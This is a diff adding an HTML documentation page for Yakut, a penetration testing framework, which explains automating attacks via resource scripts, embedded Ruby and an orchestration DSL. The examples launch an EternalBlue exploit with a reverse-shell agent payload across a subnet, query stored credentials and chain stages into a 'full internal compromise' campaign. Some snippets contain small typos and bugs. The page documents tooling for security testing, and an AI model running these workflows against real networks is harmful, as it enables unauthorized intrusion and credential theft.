@@ -1,0 +1,382 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Scripting &amp; Automation - Yakut</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="A dynamic and modular penetration testing framework and exploit development platform.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Yakut</h1>
+
+                    <div class="right-buttons">
+                        <a href="https://github.com/ardytstrn/yakut" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                        <a href="https://github.com/ardytstrn/docs/edit/main/docs/user-guide/scripting-automation.md" title="Suggest an edit" aria-label="Suggest an edit">
+                            <i id="git-edit-button" class="fa fa-edit"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="scripting--automation"><a class="header" href="#scripting--automation">Scripting &amp; Automation</a></h1>
+<ul>
+<li><a href="#scripting--automation">Scripting &amp; Automation</a>
+<ul>
+<li><a href="#1-yakuts-automation-approaches">1. Yakut's Automation Approaches</a></li>
+<li><a href="#2-resource-scripts-yrc-files">2. Resource Scripts (<code>.yrc</code> Files)</a>
+<ul>
+<li><a href="#format">Format</a></li>
+<li><a href="#usage">Usage</a></li>
+<li><a href="#example-scan_and_exploityrc">Example <code>scan_and_exploit.yrc</code></a></li>
+</ul>
+</li>
+<li><a href="#3-embedded-ruby-scripting-ruby_eval-and-irb">3. Embedded Ruby Scripting (<code>ruby_eval</code> and <code>irb</code>)</a></li>
+<li><a href="#4-orchestration-capabilities-advanced-automation--campaigns">4. <code>Orchestration</code> Capabilities (Advanced Automation &amp; Campaigns)</a>
+<ul>
+<li><a href="#running-other-capabilities">Running Other Capabilities</a></li>
+<li><a href="#conditional-logic">Conditional Logic</a></li>
+<li><a href="#human-in-the-loop-prompts">Human-in-the-Loop Prompts</a></li>
+<li><a href="#usage-1">Usage</a></li>
+</ul>
+</li>
+<li><a href="#5-choosing-the-right-automation-approach">5. Choosing the Right Automation Approach</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="1-yakuts-automation-approaches"><a class="header" href="#1-yakuts-automation-approaches">1. Yakut's Automation Approaches</a></h2>
+<p>Yakut provides several mechanisms for scripting and automation, catering to different
+levels of complexity and user needs:</p>
+<ul>
+<li><strong>Resource Scripts (<code>.yrc</code> files):</strong> Simple batch files containin sequences of Yakut console commands.</li>
+<li><strong>Embedded Ruby Scripting:</strong> Direct execution of Ruby code within the Yakut console.</li>
+<li><strong><code>Orchestration</code> Capabilities:</strong> The most powerful approach, allows for the development of complex, stateful and conditional attack workflows using a dedicated Ruby DSL.</li>
+</ul>
+<h2 id="2-resource-scripts-yrc-files"><a class="header" href="#2-resource-scripts-yrc-files">2. Resource Scripts (<code>.yrc</code> Files)</a></h2>
+<p>Resource scripts are the simplest way to automate a sequence of Yakut console commands.</p>
+<h4 id="format"><a class="header" href="#format">Format</a></h4>
+<p>A plain text file where each line is a command exactly as you would type it into the Yakut console. Comments can typically be added using <code>#</code>.</p>
+<h4 id="usage"><a class="header" href="#usage">Usage</a></h4>
+<p>To execute a resource script:</p>
+<pre><code>yakut &gt; resource /path/to/your_script.yrc
+</code></pre>
+<p>You can also potentially launch <code>yakut-console</code> with a resource script to be executed immediately.</p>
+<pre><code class="language-bash">./bin/yakut-console -r /path/to/your_script.yrc
+</code></pre>
+<h4 id="example-scan_and_exploityrc"><a class="header" href="#example-scan_and_exploityrc">Example <code>scan_and_exploit.yrc</code></a></h4>
+<pre><code class="language-ruby"># scan_and_exploit.yrc - Example Yakut resource script
+# Ensure a workspace is active before running this.
+
+# Set target range for this script
+setg RHOSTS 192.168.1.0/24
+
+# Use a reconnaissance capability
+capability use recon/network/fast_portscan
+set RHOSTS ${RHOSTS}
+set PORTS 22,80,443,445
+run
+
+# After that, a conditional logic would be more robust with Orchestration Capabilities
+
+# Attempt a common SMB exploit if port 445 is found (example)
+capability use exploit/windows/smb/eternalblue_ms17010
+set RHOSTS ${RHOSTS} # Needs a way to filter based on open ports from previous step
+set PAYLOAD windows/x64/yakut_agent/reverse_tcp
+pset LHOST tun0
+pset LPORT 4444
+run
+
+# List any sessions opened
+sessions list
+</code></pre>
+<h2 id="3-embedded-ruby-scripting-ruby_eval-and-irb"><a class="header" href="#3-embedded-ruby-scripting-ruby_eval-and-irb">3. Embedded Ruby Scripting (<code>ruby_eval</code> and <code>irb</code>)</a></h2>
+<p>For more dynamic automation and direct interaction with Yakut's internals from the
+console, you can use <code>ruby_eval</code> command or drop into an IRB session within Yakut's
+context.</p>
+<p>#### Example <code>ruby_eval</code></p>
+<pre><code class="language-ruby">yakut [ws:ACME_Corp_Q3_Audit] &gt; ruby_eval do |yk|
+  puts "[*] Automating SMB scan for all Windows targets in workspace: #{yk.workspace.current.name}"
+  windows_targets = yk.cognition.targets.where(os: /Windows/i, workspace_id: yk.workspace.current.id)
+
+  if windows_targets.empty?
+    puts "[-] No Windows targets found."
+  else
+    smb_scanner = yk.operations.find_capability("recon/network/smb_version_scan")
+
+    unless smb_scanner
+      puts "[-] SMB version scanner capability not found."
+      return
+    end
+
+    windows_targets.each do |target|
+      puts "[*] Scanning SMB on #{target.address}..."
+      opts = { 'RHOSTS' =&gt; target.address }
+      yk.operations.run_capability_async(smb_scanner.ref_name, opts)
+    end
+
+    puts "[+] SMB scans initiated for #{window_targets.count} targets. Check 'jobs list'."
+  end
+end
+</code></pre>
+<ul>
+<li><code>irb</code> (within Yakut context):
+<ul>
+<li><code>irb</code> would drop you into a full Interactive Ruby Shell (IRB) session that has the Yakut framework environment loaded.</li>
+<li>You'd have direct access to Yakut's classes and objects.</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-ruby">yakut [ws:ACME_Corp_Q3_Audit] &gt; irb
+[*] Entering Yakut IRB session... Acces framework via 'yakut_kernel' or 'yk'.
+
+irb(yakut):001:0&gt; yk.workspace.current.targets.count
+=&gt; 15
+irb(yakut):002:0&gt; creds = yk.cognition.loot.where(type: 'creds', workspace_id: yk.workspace.current.id)
+=&gt; [...]
+irb(yakut):003:0 &gt; exit
+[*] Exiting Yakut IRB session...
+yakut [ws:ACME_Corp_Q3_Audit] &gt;
+</code></pre>
+<h2 id="4-orchestration-capabilities-advanced-automation--campaigns"><a class="header" href="#4-orchestration-capabilities-advanced-automation--campaigns">4. <code>Orchestration</code> Capabilities (Advanced Automation &amp; Campaigns)</a></h2>
+<p>This is Yakut's most powerful and recommended approach for complex automation, attack
+chain simulation and campaign management.</p>
+<ul>
+<li><strong>Definition:</strong> <code>Orchestration</code> Capabilities are special typs of capabilities written in Ruby, using a dedicated DSL provided by Yakut's <code>CampaignOrchestrator</code>. They define workflows, conditional logic, state management and interactions with other capabilities.</li>
+<li><strong>Purpose:</strong>
+<ul>
+<li>To automate multi-stage attack scenarios (e.g., recon -&gt; vulnerability scan -&gt; exploit -&gt; post-exploitation -&gt; exfiltration).</li>
+<li>To implement adaptive responses based on the outcome of previous steps.</li>
+<li>To manage long-running campaigns with specific objectives.</li>
+<li>To allow for human-in-the-loop decision points within an automated workflow.</li>
+</ul>
+</li>
+</ul>
+<h4 id="running-other-capabilities"><a class="header" href="#running-other-capabilities">Running Other Capabilities</a></h4>
+<pre><code class="language-ruby"># Within an Orchestration capability's run method
+stage "Initial Reconnaissance" do
+  results = run_capability('recon/network/host_discovery_fast',
+    { 'RHOSTS' =&gt; datastore['TARGET_RANGE'] },
+    fail_on_error: false)
+
+  store_state(:live_hosts, resuts.hosts) if results&amp;.success?
+end
+</code></pre>
+<h4 id="conditional-logic"><a class="header" href="#conditional-logic">Conditional Logic</a></h4>
+<pre><code class="language-ruby">stage "Vulnerability Exploitation" do
+  get_state(:live_hosts).each do |host|
+    if host.has_service?(port: 445, product: /Samba/i) &amp;&amp; host.has_vuln?('CVE-2017-0144')
+      run_capability('exploit/linux/samba/eternal_samba_variant', { 'RHOSTS' =&gt; host.ip, ...})
+    end
+  end
+end
+</code></pre>
+<h4 id="human-in-the-loop-prompts"><a class="header" href="#human-in-the-loop-prompts">Human-in-the-Loop Prompts</a></h4>
+<pre><code class="language-ruby">stage "Critical Action" do
+  if user_confirm("Attempt to exploit Domain Controller #{dc_host.ip} with high-risk exploit?")
+    run_capability('exploit/windows/rpc/dangerous_dc_exploit', { 'RHOSTS' =&gt; dc_host.ip })
+  else
+    log_info("User skipped DC exploitation")
+  end
+end
+</code></pre>
+<h4 id="usage-1"><a class="header" href="#usage-1">Usage</a></h4>
+<pre><code class="language-console">yakut &gt; capability use orchestration/campaign/full_internal_compromise
+yakut [cap:orchestration/campaign/full_internal_compromise] &gt; set TARGET_RANGE 10.10.0.0./16
+yakut [cap:orchestration/campaign/full_internal_compromise] &gt; run
+</code></pre>
+<h2 id="5-choosing-the-right-automation-approach"><a class="header" href="#5-choosing-the-right-automation-approach">5. Choosing the Right Automation Approach</a></h2>
+<ul>
+<li><strong>Simple, linear command sequences:</strong> Use Resoure Scripts (<code>.yrc</code>).</li>
+<li><strong>Quick, interactive scripting with framework access:</strong> Use <code>ruby_eval</code> or the <code>irb</code> console.</li>
+<li><strong>Complex, stateful, conditional, multi-stage operations or campaign automation:</strong> Develop an <code>Orchestration</code> Capability.</li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../user-guide/data-management-reporting.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../developer-guide/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../user-guide/data-management-reporting.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../developer-guide/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
